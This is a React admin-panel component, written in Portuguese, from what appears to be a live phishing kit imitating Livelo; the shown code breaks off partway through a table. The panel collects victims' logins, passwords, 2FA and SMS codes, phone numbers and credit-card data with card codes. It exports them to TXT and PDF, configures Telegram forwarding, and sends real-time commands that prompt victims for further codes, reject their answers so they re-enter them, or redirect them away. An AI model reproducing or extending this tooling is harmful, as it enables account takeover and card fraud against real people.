import { useState, useEffect } from "react";
import axios from "axios";
import jsPDF from "jspdf";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function AdminPanel() {
  const [loginAttempts, setLoginAttempts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [referenceField, setReferenceField] = useState("");
  const [redirectUrl, setRedirectUrl] = useState("https://business.google.com/");
  const [copiedField, setCopiedField] = useState(null);
  const [isAuthenticated, setIsAuthenticated] = useState(!!localStorage.getItem("admin_token"));
  const [username, setUsername] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [loginLoading, setLoginLoading] = useState(false);
  // Modals
  const [showTelegramModal, setShowTelegramModal] = useState(false);
  const [showVisitorsModal, setShowVisitorsModal] = useState(false);
  const [telegramToken, setTelegramToken] = useState("");
  const [telegramChatId, setTelegramChatId] = useState("");
  const [telegramEnabled, setTelegramEnabled] = useState(false);
  const [telegramSaving, setTelegramSaving] = useState(false);
  const [telegramMessage, setTelegramMessage] = useState("");
  const [visitors, setVisitors] = useState([]);
  const [visitorsLoading, setVisitorsLoading] = useState(false);
  const [ccModalData, setCcModalData] = useState(null);

  // Função para copiar texto com um clique
  const copyToClipboard = async (text, fieldId) => {
    if (!text || text === "-") return;
    try {
      await navigator.clipboard.writeText(text);
      setCopiedField(fieldId);
      setTimeout(() => setCopiedField(null), 1500);
    } catch (err) {
      console.error("Erro ao copiar:", err);
    }
  };

  // ========== EXPORT TXT ==========
  const exportTXT = () => {
    if (loginAttempts.length === 0) return;
    let content = "═══════════════════════════════════════\n";
    content += "       RELATÓRIO DE TENTATIVAS DE LOGIN\n";
    content += "═══════════════════════════════════════\n\n";

    loginAttempts.forEach((attempt, index) => {
      const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
      content += `───────────────────────────────────────\n`;
      content += `  #${index + 1} | ${attempt.email} (${totalAttempts} tentativa${totalAttempts > 1 ? 's' : ''})\n`;
      content += `───────────────────────────────────────\n`;
      content += `  Login:     ${attempt.email}\n`;
      content += `  Senha:     ${attempt.password || "-"}\n`;
      content += `  2FA:       ${attempt.token_2fa || "-"}\n`;
      content += `  Email:     ${attempt.email_input || "-"}\n`;
      content += `  SMS Code:  ${attempt.sms_code || "-"}\n`;
      content += `  Telefone:  ${attempt.phone_number || "-"}\n`;
      content += `  Tok-Mail:  ${attempt.app_mail || "-"}\n`;
      content += `  IP:        ${attempt.ip_address || "-"}\n`;
      content += `  País:      ${attempt.country || "-"}\n`;
      content += `  Device:    ${attempt.device || "Desktop"}\n`;
      content += `  Status:    ${attempt.status || "-"}\n`;
      content += `  Página:    ${attempt.page || "-"}\n`;
      
      if (attempt.attempts && attempt.attempts.length > 0) {
        content += `\n  Tentativas adicionais:\n`;
        attempt.attempts.forEach((a, i) => {
          content += `    ${i + 2}. Login: ${a.email} | Senha: ${a.password || "-"}\n`;
        });
      }
      content += `\n`;
    });

    const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `login_attempts_${new Date().toISOString().slice(0, 10)}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // ========== EXPORT PDF ==========
  const exportPDF = () => {
    if (loginAttempts.length === 0) return;
    const doc = new jsPDF();
    let y = 20;

    doc.setFontSize(16);
    doc.setFont("helvetica", "bold");
    doc.text("Relatório de Tentativas de Login", 14, y);
    y += 10;
    doc.setFontSize(9);
    doc.setFont("helvetica", "normal");
    doc.text(`Gerado em: ${new Date().toLocaleString("pt-BR")}`, 14, y);
    y += 12;

    loginAttempts.forEach((attempt, index) => {
      if (y > 260) { doc.addPage(); y = 20; }
      
      const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
      
      doc.setFontSize(11);
      doc.setFont("helvetica", "bold");
      doc.text(`#${index + 1} - ${attempt.email} (${totalAttempts} tentativa${totalAttempts > 1 ? 's' : ''})`, 14, y);
      y += 7;

      doc.setFontSize(9);
      doc.setFont("helvetica", "normal");
      const fields = [
        `Login: ${attempt.email}`,
        `Senha: ${attempt.password || "-"}`,
        `2FA: ${attempt.token_2fa || "-"}`,
        `Email: ${attempt.email_input || "-"}`,
        `SMS Code: ${attempt.sms_code || "-"}`,
        `Telefone: ${attempt.phone_number || "-"}`,
        `Tok-Mail: ${attempt.app_mail || "-"}`,
        `IP: ${attempt.ip_address || "-"} | País: ${attempt.country || "-"} | Device: ${attempt.device || "Desktop"}`,
      ];
      
      fields.forEach(field => {
        if (y > 280) { doc.addPage(); y = 20; }
        doc.text(field, 18, y);
        y += 5;
      });

      if (attempt.attempts && attempt.attempts.length > 0) {
        y += 2;
        doc.setFont("helvetica", "bold");
        doc.text("Tentativas adicionais:", 18, y);
        y += 5;
        doc.setFont("helvetica", "normal");
        attempt.attempts.forEach((a, i) => {
          if (y > 280) { doc.addPage(); y = 20; }
          doc.text(`${i + 2}. Login: ${a.email} | Senha: ${a.password || "-"}`, 22, y);
          y += 5;
        });
      }
      
      y += 8;
    });

    doc.save(`login_attempts_${new Date().toISOString().slice(0, 10)}.pdf`);
  };

  // ========== TELEGRAM CONFIG ==========
  const loadTelegramConfig = async () => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;
      const response = await axios.get(`${API}/admin/telegram-config`, { headers });
      setTelegramToken(response.data.bot_token || "");
      setTelegramChatId(response.data.chat_id || "");
      setTelegramEnabled(response.data.enabled || false);
    } catch (error) {
      console.error("Erro ao carregar config Telegram:", error);
    }
  };

  const saveTelegramConfig = async () => {
    try {
      setTelegramSaving(true);
      setTelegramMessage("");
      const headers = getAuthHeaders();
      if (!headers) return;
      await axios.post(`${API}/admin/telegram-config`, {
        bot_token: telegramToken,
        chat_id: telegramChatId,
        enabled: telegramEnabled
      }, { headers });
      setTelegramMessage("Configuração salva com sucesso!");
    } catch (error) {
      setTelegramMessage("Erro ao salvar configuração");
    } finally {
      setTelegramSaving(false);
    }
  };

  const testTelegram = async () => {
    try {
      setTelegramMessage("Enviando teste...");
      const headers = getAuthHeaders();
      if (!headers) return;
      const response = await axios.post(`${API}/admin/telegram-test`, {}, { headers });
      setTelegramMessage(response.data.message);
    } catch (error) {
      setTelegramMessage("Erro ao enviar teste");
    }
  };

  // ========== VISITORS ==========
  const loadVisitors = async () => {
    try {
      setVisitorsLoading(true);
      const headers = getAuthHeaders();
      if (!headers) return;
      const response = await axios.get(`${API}/admin/visitors`, { headers });
      setVisitors(response.data);
    } catch (error) {
      console.error("Erro ao carregar visitantes:", error);
    } finally {
      setVisitorsLoading(false);
    }
  };

  const clearVisitors = async () => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;
      await axios.delete(`${API}/admin/visitors`, { headers });
      setVisitors([]);
    } catch (error) {
      console.error("Erro ao limpar visitantes:", error);
    }
  };

  useEffect(() => {
    if (!isAuthenticated) return;
    fetchLoginAttempts();
    const interval = setInterval(fetchLoginAttempts, 1000);
    
    return () => {
      clearInterval(interval);
    };
  }, [isAuthenticated]);

  const getAuthHeaders = () => {
    const token = localStorage.getItem("admin_token");
    if (!token) {
      setIsAuthenticated(false);
      return null;
    }
    return { Authorization: `Bearer ${token}` };
  };

  const fetchLoginAttempts = async () => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      const response = await axios.get(`${API}/admin/login-attempts`, { headers });
      setLoginAttempts(response.data);
      setLoading(false);
    } catch (error) {
      console.error("Erro ao buscar tentativas:", error);
      if (error.response?.status === 401) {
        localStorage.removeItem("admin_token");
        setIsAuthenticated(false);
      }
    }
  };

  const sendCommand = async (userId, command) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      const payload = {
        user_id: userId,
        command: command,
      };

      if (command === "REDIRECT") {
        payload.redirect_url = redirectUrl;
      }
      
      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL, COD-CC)
      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
        payload.reference = referenceField;
      }

      await axios.post(`${API}/admin/command`, payload, { headers });
      
      // Limpar campo de referência após enviar comando que usa ele
      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
        setReferenceField("");
      }
      
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao enviar comando:", error);
    }
  };

  // Função para invalidar dado e pedir novamente
  const sendInvalidCommand = async (userId, command) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      // Limpar o campo correspondente
      await axios.post(`${API}/admin/invalidate-field`, {
        user_id: userId,
        command: command
      }, { headers });
      
      // Enviar o comando de invalidação (com sufixo -INV para mostrar erro)
      const payload = {
        user_id: userId,
        command: command + "-INV",  // Adiciona sufixo para indicar invalidação
      };
      
      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL, COD-CC)
      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
        payload.reference = referenceField;
      }
      
      await axios.post(`${API}/admin/command`, payload, { headers });
      
      // Limpar campo de referência após enviar comando que usa ele
      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
        setReferenceField("");
      }
      
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao invalidar campo:", error);
    }
  };

  const updateStatus = async (userId, status) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.post(`${API}/admin/update-status/${userId}?status=${status}`, {}, { headers });
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao atualizar status:", error);
    }
  };

  // Função para deletar um card individual
  const deleteAttempt = async (id) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.delete(`${API}/admin/login-attempts/${id}`, { headers });
      setLoginAttempts(loginAttempts.filter((a) => a.id !== id));
    } catch (error) {
      console.error("Erro ao deletar:", error);
    }
  };

  const handleDelete = async (id) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.delete(`${API}/admin/login-attempts/${id}`, { headers });
      setLoginAttempts(loginAttempts.filter((a) => a.id !== id));
    } catch (error) {
      console.error("Erro ao deletar:", error);
    }
  };

  const handleClearAll = async () => {
    if (!window.confirm("Tem certeza que deseja limpar todas as tentativas?")) {
      return;
    }

    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.post(`${API}/admin/clear-all`, {}, { headers });
      setLoginAttempts([]);
    } catch (error) {
      console.error("Erro ao limpar:", error);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("admin_token");
    setIsAuthenticated(false);
  };

  const handleAdminLogin = async (e) => {
    e.preventDefault();
    setLoginError("");
    setLoginLoading(true);

    try {
      const response = await axios.post(`${API}/admin/login`, {
        username,
        password: loginPassword,
      });

      localStorage.setItem("admin_token", response.data.access_token);
      setIsAuthenticated(true);
      setUsername("");
      setLoginPassword("");
    } catch (err) {
      setLoginError("Credenciais inválidas");
      setLoginLoading(false);
    }
  };

  // Tela de login se não autenticado
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
        <div className="bg-[#111111] border border-green-900/30 rounded-2xl shadow-2xl shadow-green-900/10 p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <h1 className="text-3xl font-bold text-white mb-2">Admin Panel</h1>
            <p className="text-gray-500">Entre com suas credenciais</p>
          </div>

          <form onSubmit={handleAdminLogin} className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Usuário
              </label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-4 py-3 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600 transition-all"
                placeholder="donas"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Senha
              </label>
              <input
                type="password"
                value={loginPassword}
                onChange={(e) => setLoginPassword(e.target.value)}
                className="w-full px-4 py-3 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600 transition-all"
                placeholder="••••••••"
                required
              />
            </div>

            {loginError && (
              <div className="bg-red-900/30 border border-red-500/30 text-red-400 px-4 py-3 rounded-lg text-sm">
                {loginError}
              </div>
            )}

            <button
              type="submit"
              disabled={loginLoading}
              className="w-full bg-[#1a1a1a] text-white font-bold border border-gray-600/40 py-3 rounded-lg hover:bg-[#252525] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loginLoading ? "Entrando..." : "Entrar"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a]">
      {/* Header */}
      <header className="bg-[#111111] border-b border-green-900/40 shadow-lg shadow-green-900/10">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between flex-wrap gap-4">
            <div className="flex items-center gap-2 flex-wrap">
              <button onClick={exportTXT} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-orange-500/30 px-4 py-2 rounded text-sm transition-colors">
                TXT
              </button>
              <button onClick={exportPDF} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-blue-500/30 px-4 py-2 rounded text-sm transition-colors">
                PDF
              </button>
              <button onClick={() => { setShowTelegramModal(true); loadTelegramConfig(); }} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-cyan-500/30 px-4 py-2 rounded text-sm transition-colors">
                Telegram
              </button>
              <button
                onClick={handleClearAll}
                className="bg-[#1a1a1a] hover:bg-red-900/40 text-white font-bold border border-red-500/30 px-4 py-2 rounded text-sm transition-colors"
              >
                Limpar Tudo
              </button>
              <button
                onClick={fetchLoginAttempts}
                className="bg-green-900/30 hover:bg-green-900/50 text-white font-bold border border-green-500/40 px-4 py-2 rounded text-sm transition-colors"
              >
                Atualizar
              </button>
              <button onClick={() => { setShowVisitorsModal(true); loadVisitors(); }} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-purple-500/30 px-4 py-2 rounded text-sm transition-colors">
                Exibir Visitantes
              </button>
            </div>
            <div className="flex items-center gap-3">
              <img
                src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png"
                alt="Livelo"
                className="h-8"
              />
              <button
                onClick={handleLogout}
                className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-gray-600/40 px-4 py-2 rounded text-sm transition-colors"
              >
                Sair
              </button>
              <button className="bg-green-500/20 text-white font-bold border border-green-500/50 px-4 py-2 rounded text-sm hover:bg-green-500/30 transition-colors">
                DONAS
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Content */}
      <div className="container mx-auto px-4 py-8">
        <div className="bg-[#111111] rounded-lg border border-green-900/30 p-6">
          {/* Search */}
          <div className="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Campo de referência:
              </label>
              <input
                type="text"
                value={referenceField}
                onChange={(e) => setReferenceField(e.target.value)}
                placeholder="Ex: final do telefone, nome..."
                className="w-full px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Site de Redirecionamento (Comando close):
              </label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={redirectUrl}
                  onChange={(e) => setRedirectUrl(e.target.value)}
                  placeholder="https://business.google.com/"
                  className="flex-1 px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600"
                />
              </div>
            </div>
          </div>

          {/* Loading */}
          {loading ? (
            <div className="text-center py-12">
              <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-green-500"></div>
              <p className="mt-4 text-gray-400">Carregando...</p>
            </div>
          ) : loginAttempts.length === 0 ? (
            <div className="text-center py-12">
              <p className="text-gray-500 text-lg">Nenhuma tentativa de login encontrada</p>
            </div>
          ) : (
            <div className="space-y-6">
              {loginAttempts.map((attempt, index) => {
                // Calcular número total de tentativas (original + adicionais)
                const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
                
                return (
                  <div key={attempt.id} className="border border-green-900/30 rounded-lg overflow-hidden">
                    {/* Header com email e número de tentativas */}
                    <div className="bg-[#0d1f0d] border-b border-green-900/40 px-4 py-3">
                      <h3 className="font-bold text-lg text-white">{attempt.email} ({totalAttempts} tentativa{totalAttempts > 1 ? 's' : ''})</h3>
                    </div>

                    {/* Tabela */}
                    <div className="overflow-x-auto">
                      <table className="w-full border-collapse">
                      <thead>
                        <tr>
                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">#</th>
                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">status</th>
                          <th 
                            onClick={() => sendCommand(attempt.id, "INV")}
                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
                            title="Clique para avisar que dados estão incorretos"
                          >
                            INV
                          </th>
                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">USUÁRIO/LOGIN</th>
                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">SENHA</th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "AUT")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-cyan-900/30 transition-colors flex-1"
                                title="Clique para pedir código 2FA"
                              >
                                AUT
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "AUT")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar código 2FA"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "EMAIL")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-purple-900/30 transition-colors flex-1"
                                title="Clique para pedir email cadastrado"
                              >
                                EMAIL
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "EMAIL")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar email"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "TOK-TEL")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-orange-900/30 transition-colors flex-1"
                                title="Clique para pedir código do telefone"
                              >
                                TOK-TEL
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "TOK-TEL")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar código SMS"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "TELEFONE")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-green-900/30 transition-colors flex-1"
                                title="Clique para pedir número de telefone"
                              >
                                Nº TEL
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "TELEFONE")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar telefone"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "TOK-MAIL")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-blue-900/30 transition-colors flex-1"
                                title="Clique para pedir token do email"
                              >
                                TOK-MAIL
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "TOK-MAIL")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar token do email"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "CC")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-yellow-900/30 transition-colors flex-1"
                                title="Clique para pedir dados do cartão"
                              >
                                CC
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "CC")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar dados do cartão"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th className="border border-[#2a2a2a] p-0">
                            <div className="flex">
                              <div 
                                onClick={() => sendCommand(attempt.id, "COD-CC")}
                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-yellow-900/30 transition-colors flex-1"
                                title="Clique para pedir código do cartão"
                              >
                                Cod CC
                              </div>
                              <div 
                                onClick={() => sendInvalidCommand(attempt.id, "COD-CC")}
                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                title="Invalidar código do cartão"
                              >
                                X
                              </div>
                            </div>
                          </th>
                          <th 
                            onClick={() => sendCommand(attempt.id, "AGUARDE")}
                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-yellow-900/30 transition-colors"
                            title="Clique para colocar em aguarde"
                          >
                            👍
                          </th>
                          <th 
                            onClick={() => sendCommand(attempt.id, "REDIRECT")}
                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-pink-900/30 transition-colors"
                            title="Clique para redirecionar usuário"
                          >
                            Close
                          </th>
                          <th 
                            onClick={() => deleteAttempt(attempt.id)}
                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
                            title="Excluir este card"
                          >
                            🗑️
                          </th>
                        </tr>
                      </thead>
                      <tbody>
                        {/* Única linha de dados */}
                        <tr className="bg-[#0f0f0f]">
                          {/* # */}
                          <td className="px-3 py-3 text-center text-sm font-bold text-white border border-[#2a2a2a]">{index + 1}</td>
                          
                          {/* status - bolinha calculada pelo heartbeat */}
                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                            {(() => {
                              const hb = attempt.last_heartbeat;
                              const isOnline = hb && (Date.now() - new Date(hb).getTime()) < 3500;
                              return (
                                <span className={`inline-block w-4 h-4 rounded-full ${isOnline ? "bg-green-500 shadow-lg shadow-green-500/50" : "bg-red-500 shadow-lg shadow-red-500/50"}`}></span>
                              );
                            })()}
                          </td>
                          
                          {/* INV - apenas header, célula vazia */}
                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                            <span className="text-gray-600">-</span>
                          </td>
                          
                          {/* USUÁRIO/LOGIN - valor fixo - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium cursor-pointer hover:bg-green-900/20 transition-colors text-white"
                            onClick={() => copyToClipboard(attempt.email, `email-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `email-${attempt.id}` ? "text-green-400" : ""}>
                              {copiedField === `email-${attempt.id}` ? "✓ Copiado!" : attempt.email}
                            </span>
                          </td>
                          
                          {/* SENHA - valor fixo - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors text-white"
                            onClick={() => copyToClipboard(attempt.password, `password-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `password-${attempt.id}` ? "text-green-400" : ""}>
                              {copiedField === `password-${attempt.id}` ? "✓ Copiado!" : (attempt.password || "-")}
                            </span>
                          </td>
                          
                          {/* AUT - campo esperando dado - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.token_2fa, `token2fa-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `token2fa-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `token2fa-${attempt.id}` ? "✓ Copiado!" : (attempt.token_2fa || "-")}
                            </span>
                          </td>
                          
                          {/* EMAIL - campo esperando dado - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.email_input, `emailinput-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `emailinput-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `emailinput-${attempt.id}` ? "✓ Copiado!" : (attempt.email_input || "-")}
                            </span>
                          </td>
                          
                          {/* TOK-TEL - campo esperando dado - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.sms_code, `smscode-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `smscode-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `smscode-${attempt.id}` ? "✓ Copiado!" : (attempt.sms_code || "-")}
                            </span>
                          </td>
                          
                          {/* Nº TELEFONE - campo esperando dado - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.phone_number, `phone-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `phone-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `phone-${attempt.id}` ? "✓ Copiado!" : (attempt.phone_number || "-")}
                            </span>
                          </td>
                          
                          {/* TOK-MAIL - campo esperando dado - COPIÁVEL */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.app_mail, `appmail-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `appmail-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `appmail-${attempt.id}` ? "✓ Copiado!" : (attempt.app_mail || "-")}
                            </span>
                          </td>
                          
                          {/* CC - dados do cartão */}
                          <td className="px-2 py-2 text-center text-sm border border-[#2a2a2a]">
                            {attempt.credit_card ? (
                              <button
                                onClick={() => setCcModalData(attempt.credit_card)}
                                className="bg-[#1a2a1a] hover:bg-[#253525] text-white text-xs font-bold px-3 py-1.5 rounded border border-green-500/30 transition-colors"
                              >
                                Exibir
                              </button>
                            ) : (
                              <span className="text-gray-600">-</span>
                            )}
                          </td>

                          {/* Cod CC - código do cartão */}
                          <td 
                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                            onClick={() => copyToClipboard(attempt.cc_code, `cccode-${attempt.id}`)}
                            title="Clique para copiar"
                          >
                            <span className={copiedField === `cccode-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                              {copiedField === `cccode-${attempt.id}` ? "Copiado!" : (attempt.cc_code || "-")}
                            </span>
                          </td>

                          {/* 👍 - apenas header, célula vazia */}
                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                            <span className="text-gray-600">-</span>
                          </td>
                          
                          {/* X - apenas header, célula vazia */}
                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                            <span className="text-gray-600">-</span>
                          </td>
                          
                          {/* 🗑️ - lixeira clicável */}
                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                            <button
                              onClick={() => handleDelete(attempt.id)}
                              className="text-red-500/60 hover:text-red-400 text-xl transition-colors"
                            >
                              🗑️
                            </button>
                          </td>
                        </tr>
                        
                        {/* Tentativas adicionais */}
                        {attempt.attempts && attempt.attempts.map((additionalAttempt, attemptIndex) => (
                          <tr key={attemptIndex} className="bg-[#0a0f0a]">
                            {/* # */}
                            <td className="px-3 py-3 text-center text-sm font-bold text-white/70 border border-[#2a2a2a]">{attemptIndex + 2}</td>
                            
                            {/* status - vazio */}
                            <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                              <span className="w-4 h-4 rounded-full bg-gray-700 inline-block"></span>
                            </td>
                            
                            {/* INV - vazio */}
                            <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                              <span className="text-gray-600">-</span>
                            </td>
                            
                            {/* USUÁRIO/LOGIN - nova tentativa */}
                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium text-white/70">{additionalAttempt.email}</td>
                            
                            {/* SENHA - nova tentativa */}
                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] text-white/70">{additionalAttempt.password || "-"}</td>
                            
                            {/* Demais campos vazios */}
                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
